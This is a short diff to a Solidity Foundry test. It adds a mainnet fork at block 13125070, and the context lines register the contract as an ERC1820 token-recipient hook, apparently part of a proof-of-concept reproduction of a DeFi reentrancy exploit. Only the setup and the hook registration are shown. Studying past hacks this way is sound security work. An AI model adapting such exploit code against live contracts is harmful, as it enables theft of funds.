@@ -31,8 +31,12 @@ contract ContractTest is DSTest {
     address public mywallet;
 
     address[]  path = [0xfF20817765cB7f73d4bde2e66e067E58D11095C2,0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2];
-   
-
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/eth", 13125070); // fork mainnet at block 13125070
+        cheats.selectFork(mainnetFork);
+    }
     function test() public{
         payable(address(0)).transfer(address(this).balance);
         ierc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
